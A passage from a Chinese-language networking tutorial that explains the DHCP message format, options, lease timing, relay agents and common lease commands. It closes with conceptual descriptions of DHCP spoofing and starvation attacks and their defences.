class="hljs-number">24</span>h       租约到期，释放IP，重新DORA<br><br>续期过程（简化的DORA）：<br>客户端 → DHCP Request (续期请求)<br>服务器 → DHCP Ack (同意续期) 或 Nak (拒绝，重新DORA)<br></code></pre></td></tr></table></figure><p><strong>情况3：客户端重启</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">场景：客户端记得上次使用的<span class="hljs-built_in">IP</span><br><br>快速重连：<br>客户端 → DHCP Request (直接请求上次的<span class="hljs-built_in">IP</span>)<br>        源<span class="hljs-built_in">IP</span>: <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>        请求<span class="hljs-built_in">IP</span>: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> (上次的)<br><br>服务器 → DHCP Ack (如果<span class="hljs-built_in">IP</span>仍然可用)<br>     或 DHCP Nak (<span class="hljs-built_in">IP</span>已被占用，重新DORA)<br><br>优点：<br>- 跳过Discover和Offer<br>- 更快获得网络连接<br>- 减少网络流量<br></code></pre></td></tr></table></figure><hr><h2 id="3-DHCP报文格式">3. DHCP报文格式</h2><h3 id="3-1-DHCP报文结构">3.1 DHCP报文结构</h3><p>DHCP基于<strong>BOOTP协议</strong>，使用UDP传输：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs erlang">UDP端口：<br>- 客户端端口：68<br>- 服务器端口：67<br><br>报文格式（最小236字节）：<br>┌─────────────────────────────────────┐<br>│ Op <span class="hljs-params">(<span class="hljs-number">1</span>字节)</span>         操作码            │ 1=请求, 2=响应<br>│ HType <span class="hljs-params">(<span class="hljs-number">1</span>字节)</span>      硬件类型          │ 1=以太网<br>│ HLen <span class="hljs-params">(<span class="hljs-number">1</span>字节)</span>       硬件地址长度      │ 6=MAC地址<br>│ Hops <span class="hljs-params">(<span class="hljs-number">1</span>字节)</span>       跳数              │ 中继计数<br>├─────────────────────────────────────┤<br>│ Transaction ID <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span> 事务ID        │ 随机数，匹配请求和响应<br>├─────────────────────────────────────┤<br>│ Seconds <span class="hljs-params">(<span class="hljs-number">2</span>字节)</span>    开机秒数          │ 客户端开机后的秒数<br>│ Flags <span class="hljs-params">(<span class="hljs-number">2</span>字节)</span>      标志位            │ 广播标志等<br>├─────────────────────────────────────┤<br>│ Client IP <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span>  客户端IP          │ 续期时使用<br>│ Your IP <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span>    你的IP            │ 服务器分配的IP<br>│ Server IP <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span>  服务器IP          │ DHCP服务器地址<br>│ Gateway IP <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span> 网关IP            │ 中继代理地址<br>├─────────────────────────────────────┤<br>│ Client MAC <span class="hljs-params">(<span class="hljs-number">16</span>字节)</span> 客户端硬件地址   │ 前6字节是MAC<br>├─────────────────────────────────────┤<br>│ Server Name <span class="hljs-params">(<span class="hljs-number">64</span>字节)</span> 服务器名称      │ 可选<br>│ Boot File <span class="hljs-params">(<span class="hljs-number">128</span>字节)</span>  启动文件名      │ 可选<br>├─────────────────────────────────────┤<br>│ Magic Cookie <span class="hljs-params">(<span class="hljs-number">4</span>字节)</span> 魔术字          │ 0x63825363<br>├─────────────────────────────────────┤<br>│ Options <span class="hljs-params">(可变)</span>     选项字段          │ DHCP消息类型、参数等<br>└─────────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="3-2-重要选项（Options）">3.2 重要选项（Options）</h3><p>DHCP的核心功能在Options字段：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs less">格式：<span class="hljs-selector-attr">[选项代码]</span><span class="hljs-selector-attr">[长度]</span><span class="hljs-selector-attr">[数据]</span><br><br>常用选项：<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">53</span> (DHCP消息类型) <span class="hljs-selector-tag">-</span> <span class="hljs-number">1</span>字节<br>├── <span class="hljs-number">1</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Discover</span><br>├── <span class="hljs-number">2</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Offer</span><br>├── <span class="hljs-number">3</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Request</span><br>├── <span class="hljs-number">4</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Decline</span> (拒绝)<br>├── <span class="hljs-number">5</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Ack</span><br>├── <span class="hljs-number">6</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Nak</span> (否认)<br>├── <span class="hljs-number">7</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Release</span> (释放)<br>└── <span class="hljs-number">8</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Inform</span> (通知)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">1</span> (子网掩码) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节<br>└── <span class="hljs-number">255.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">3</span> (默认网关) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节×<span class="hljs-selector-tag">n</span><br>└── <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">6</span> (DNS服务器) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节×<span class="hljs-selector-tag">n</span><br>├── <span class="hljs-number">8.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><br>└── <span class="hljs-number">8.8</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.4</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">51</span> (租约时间) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节<br>└── <span class="hljs-number">86400</span> (秒)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">54</span> (DHCP服务器标识) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节<br>└── <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">58</span> (T1续约时间) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节<br>└── <span class="hljs-number">43200</span> (<span class="hljs-number">50%</span>租期)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">59</span> (T2重绑时间) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>字节<br>└── <span class="hljs-number">75600</span> (<span class="hljs-number">87.5%</span>租期)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">255</span> (结束标记)<br>└── 选项结束<br></code></pre></td></tr></table></figure><h3 id="3-3-报文示例">3.3 报文示例</h3><p><strong>DHCP Discover报文</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">┌─────────────────────────────────────┐</span><br><span class="hljs-attribute">│ Op</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (请求)                         │</span><br><span class="hljs-attribute">│ HType</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (以太网)                    │</span><br><span class="hljs-attribute">│ HLen</span><span class="hljs-punctuation">:</span> <span class="hljs-string">6                              │</span><br><span class="hljs-attribute">│ Hops</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0                              │</span><br><span class="hljs-attribute">│ Transaction ID</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x3d1d6b                │</span><br><span class="hljs-attribute">│ Seconds</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0                           │</span><br><span class="hljs-attribute">│ Flags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0000                        │</span><br><span class="hljs-attribute">│ Client IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                   │</span><br><span class="hljs-attribute">│ Your IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                     │</span><br><span class="hljs-attribute">│ Server IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                   │</span><br><span class="hljs-attribute">│ Gateway IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                  │</span><br><span class="hljs-attribute">│ Client MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">aa:bb:cc:dd:ee:ff        │</span><br><span class="hljs-attribute">│ Magic Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x63825363             │</span><br><span class="hljs-attribute">│ Options</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                            │</span><br><span class="hljs-attribute">│   - Option 53</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (Discover)          │</span><br><span class="hljs-attribute">│   - Option 55</span><span class="hljs-punctuation">:</span> <span class="hljs-string">请求参数列表           │</span><br><span class="hljs-attribute">│     (1,3,6,15,51,54,58,59)          │</span><br><span class="hljs-attribute">│   - Option 255</span><span class="hljs-punctuation">:</span> <span class="hljs-string">End                  │</span><br>└─────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="4-IP地址租约管理">4. IP地址租约管理</h2><h3 id="4-1-租约生命周期">4.1 租约生命周期</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scss">租约状态机：<br><br>    <span class="hljs-selector-attr">[无IP]</span><br>      ↓<br>   DHCP DORA<br>      ↓<br>   <span class="hljs-selector-attr">[已绑定]</span> ←──────┐<br>      ↓ (<span class="hljs-number">50%</span>租期)  │<br>   <span class="hljs-selector-attr">[续约中]</span> ────────┘ (续约成功)<br>      ↓ (失败)<br>   <span class="hljs-selector-attr">[重绑中]</span> ←──────┐<br>      ↓ (<span class="hljs-number">87.5%</span>租期)│<br>   <span class="hljs-selector-attr">[广播续约]</span> ──────┘ (续约成功)<br>      ↓ (失败)<br>   <span class="hljs-selector-attr">[租约过期]</span><br>      ↓<br>    释放IP<br>      ↓<br>   重新DORA<br></code></pre></td></tr></table></figure><h3 id="4-2-租约时间计算">4.2 租约时间计算</h3><p><strong>示例：租期24小时</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs excel">时间点计算：<br><br>租约开始：<span class="hljs-number">2024</span>-<span class="hljs-number">01</span>-<span class="hljs-number">15</span> <span class="hljs-symbol">10:00</span><span class="hljs-symbol">:00</span><br>租约时长：<span class="hljs-number">86400</span>秒 (<span class="hljs-number">24</span>小时)<br><br>┌──────────────────────────────────────────┐<br>│ <span class="hljs-number">0%</span>        <span class="hljs-number">50%</span>       <span class="hljs-number">87.5%</span>       <span class="hljs-number">100%</span>      │<br>│ │          │          │           │       │<br>│ ├──────────┼──────────┼───────────┤       │<br>│ │          │          │           │       │<br>│ <span class="hljs-symbol">10:00</span>    <span class="hljs-symbol">22:00</span>    <span class="hljs-symbol">04:30</span>       <span class="hljs-symbol">10:00</span>      │<br>│ 开始      <span class="hljs-symbol">T1</span>续约    <span class="hljs-symbol">T2</span>重绑      过期      │<br>└──────────────────────────────────────────┘<br><br><span class="hljs-symbol">T1</span> (Renewing <span class="hljs-built_in">Time</span>)<span class="hljs-symbol">:</span><br>= 开始时间 + 租期 × <span class="hljs-number">50%</span><br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">12</span>小时<br>= <span class="hljs-symbol">22:00</span><br><br><span class="hljs-symbol">T2</span> (Rebinding <span class="hljs-built_in">Time</span>)<span class="hljs-symbol">:</span><br>= 开始时间 + 租期 × <span class="hljs-number">87.5%</span><br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">21</span>小时<br>= <span class="hljs-symbol">04:30</span> (次日)<br><br>到期时间<span class="hljs-symbol">:</span><br>= 开始时间 + 租期<br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">24</span>小时<br>= <span class="hljs-symbol">10:00</span> (次日)<br></code></pre></td></tr></table></figure><h3 id="4-3-租约管理策略">4.3 租约管理策略</h3><p><strong>服务器端地址池管理</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">地址池配置：<br>├── 网络：<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br>├── 可用范围：<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> - <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span><br>├── 保留地址：<br>│   ├── <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> (网关)<br>│   ├── <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> (DNS)<br>│   └── <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>-<span class="hljs-number">50</span> (静态IP)<br>└── DHCP池：<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>-<span class="hljs-number">200</span> (<span class="hljs-number">101</span>个地址)<br><br>分配策略：<br><span class="hljs-number">1.</span> 优先分配客户端上次使用的IP<br><span class="hljs-number">2.</span> 选择租约最早到期的IP<br><span class="hljs-number">3.</span> 避免刚释放的IP（等待<span class="hljs-number">2</span>分钟）<br><span class="hljs-number">4.</span> 记录每个IP的租约信息<br></code></pre></td></tr></table></figure><p><strong>客户端租约状态</strong>：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">租约数据库（示例）：<br><br>MAC地址            IP地址         租约开始            租约结束            状态<br>aa:bb:cc:dd:ee:ff  192.168.1.100  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 10:00   2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 10:00   已分配<br>11:22:33:44:55:66  192.168.1.101  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 08:30   2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 08:30   已分配<br>aa:aa:aa:aa:aa:aa  192.168.1.102  2024<span class="hljs-string">-01</span><span class="hljs-string">-14</span> 20:00   2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 20:00   已过期<br></code></pre></td></tr></table></figure><hr><h2 id="5-DHCP中继代理">5. DHCP中继代理</h2><h3 id="5-1-为什么需要中继？">5.1 为什么需要中继？</h3><p><strong>问题</strong>：DHCP使用广播，但广播不能跨越路由器</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">场景：公司有多个子网</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">[子网1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.0/24]</span><br>     <span class="hljs-attribute">↓</span><br><span class="hljs-attribute">  [路由器] ← 广播在这里被阻挡</span><br><span class="hljs-attribute">     ↓</span><br><span class="hljs-attribute">[子网2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.2.0/24]  ← DHCP服务器在这里</span><br>     <span class="hljs-attribute">↓</span><br><span class="hljs-attribute">[子网3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.3.0/24]</span><br><br>问题：<br><span class="hljs-bullet">-</span> <span class="hljs-string">子网1和子网3的客户端无法联系到子网2的DHCP服务器</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">需要每个子网都部署DHCP服务器？❌ 太麻烦</span><br></code></pre></td></tr></table></figure><p><strong>解决方案：DHCP Relay（中继代理）</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[子网1客户端]</span><br>     ↓ 广播 DHCP Discover<br><span class="hljs-string">[路由器/中继代理]</span><br>     ↓ 单播转发到DHCP服务器<br><span class="hljs-string">[子网2 DHCP服务器]</span><br>     ↓ 单播响应到中继代理<br><span class="hljs-string">[路由器/中继代理]</span><br>     ↓ 转发给客户端<br><span class="hljs-string">[子网1客户端]</span> ✅ 获得IP<br></code></pre></td></tr></table></figure><h3 id="5-2-中继工作流程">5.2 中继工作流程</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">1. 客户端广播 Discover</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-attribute">源IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0</span><br>   <span class="hljs-attribute">目标IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">255.255.255.255 (广播)</span><br><br><span class="hljs-attribute">2. 中继代理收到，修改报文</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-attribute">源IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.1 (中继代理地址)</span><br>   <span class="hljs-attribute">目标IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.2.100 (DHCP服务器，单播)</span><br>   <span class="hljs-attribute">Gateway IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.1 (填入中继地址)</span><br>   <span class="hljs-attribute">Hops</span><span class="hljs-punctuation">:</span> <span class="hljs-string">增加1</span><br><br><span class="hljs-attribute">3. DHCP服务器处理</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">看到Gateway IP，知道客户端在子网1</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">从子网1的地址池分配IP</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">单播响应给中继代理</span><br><br><span class="hljs-attribute">4. 中继代理转发</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">将响应转发给客户端（广播或单播）</span><br></code></pre></td></tr></table></figure><hr><h2 id="6-实战项目：DHCP分析工具">6. 实战项目：DHCP分析工具</h2><h3 id="6-1-项目功能">6.1 项目功能</h3><p>我们将实现：</p><ol><li>DHCP报文构建器</li><li>DHCP报文解析器</li><li>模拟DHCP客户端</li><li>地址租约信息查看</li></ol><h3 id="6-2-工具演示">6.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看本机DHCP租约信息</span><br>python day13_dhcp_tool.py --show-lease<br><br><span class="hljs-comment"># 解析DHCP报文（从pcap文件）</span><br>python day13_dhcp_tool.py --parse capture.pcap<br><br><span class="hljs-comment"># 模拟DHCP Discover</span><br>python day13_dhcp_tool.py --discover<br><br><span class="hljs-comment"># 释放当前IP</span><br>python day13_dhcp_tool.py --release<br></code></pre></td></tr></table></figure><hr><h2 id="7-知识拓展">7. 知识拓展</h2><h3 id="7-1-查看DHCP信息的命令">7.1 查看DHCP信息的命令</h3><p><strong>Windows</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看DHCP租约信息</span><br>ipconfig /all<br><br>输出示例：<br>以太网适配器 以太网:<br>   DHCP 已启用: 是<br>   IPv4 地址: 192.168.1.100<br>   子网掩码: 255.255.255.0<br>   默认网关: 192.168.1.1<br>   DHCP 服务器: 192.168.1.1<br>   获得租约的时间: 2024年1月15日 10:00:00<br>   租约过期的时间: 2024年1月16日 10:00:00<br>   DNS 服务器: 8.8.8.8<br><br><span class="hljs-comment"># 释放IP地址</span><br>ipconfig /release<br><br><span class="hljs-comment"># 重新获取IP</span><br>ipconfig /renew<br></code></pre></td></tr></table></figure><p><strong>Linux</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网卡配置</span><br>ip addr show<br>ifconfig<br><br><span class="hljs-comment"># 查看DHCP租约（不同发行版路径不同）</span><br><span class="hljs-built_in">cat</span> /var/lib/dhcp/dhclient.leases       <span class="hljs-comment"># Debian/Ubuntu</span><br><span class="hljs-built_in">cat</span> /var/lib/dhclient/dhclient.leases   <span class="hljs-comment"># CentOS/RHEL</span><br><br><span class="hljs-comment"># 释放和重新获取（使用dhclient）</span><br><span class="hljs-built_in">sudo</span> dhclient -r eth0  <span class="hljs-comment"># 释放</span><br><span class="hljs-built_in">sudo</span> dhclient eth0     <span class="hljs-comment"># 重新获取</span><br><br><span class="hljs-comment"># 查看DHCP客户端日志</span><br>journalctl -u NetworkManager | grep -i dhcp<br></code></pre></td></tr></table></figure><p><strong>Mac</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网络配置</span><br>ifconfig<br><br><span class="hljs-comment"># 释放DHCP租约</span><br><span class="hljs-built_in">sudo</span> ipconfig <span class="hljs-built_in">set</span> en0 DHCP<br><br><span class="hljs-comment"># 查看DHCP详细信息</span><br>ipconfig getpacket en0<br></code></pre></td></tr></table></figure><h3 id="7-2-DHCP安全问题">7.2 DHCP安全问题</h3><p><strong>1. DHCP欺骗攻击</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">攻击场景：<br>┌──────────────────────────────────────┐<br>│ 1. 攻击者部署假DHCP服务器             │<br>│ 2. 客户端发送 Discover                │<br>│ 3. 假服务器快速响应 Offer              │<br>│    - 分配正常IP                       │<br>│    - 但网关指向攻击者                  │<br>│    - DNS指向攻击者                     │<br>│ 4. 客户端流量被劫持                   │<br>└──────────────────────────────────────┘<br><br>防护措施：<br><span class="hljs-bullet">- </span>DHCP Snooping（交换机特性）<br><span class="hljs-bullet">- </span>端口安全（只允许特定端口接收DHCP响应）<br><span class="hljs-bullet">- </span>802.1X认证<br></code></pre></td></tr></table></figure><p><strong>2. DHCP饿死攻击</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击原理：<br><span class="hljs-bullet">1.</span> 攻击者伪造大量不同MAC地址<br><span class="hljs-bullet">2.</span> 快速请求IP地址<br><span class="hljs-bullet">3.</span> 耗尽DHCP地址池<br><span class="hljs-bullet">4.</span> 正常用户无法获得IP<br><br>防护：<br><span class="hljs-bullet">-</span> 限制端口的MAC地址数量<br><span class="hljs-bullet">-</span> DHCP地址池足够大<br><span class="hljs-bullet">-</span> 启用端口安全<br></code></pre></td></tr></table></figure><p><strong>3. 非法DHCP服务器</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">场景：<br><span class="hljs-bullet">- </span>员工私自接入路由器（启用DHCP）<br><span class="hljs-bullet">- </span>导致网络混乱<br><br>检测方法：<br><span class="hljs-bullet">- </span>监控网络中的DHCP响应<br><span class="hljs-bullet">- </span>使用DHCP Snooping<br><span class="hljs-bullet">- 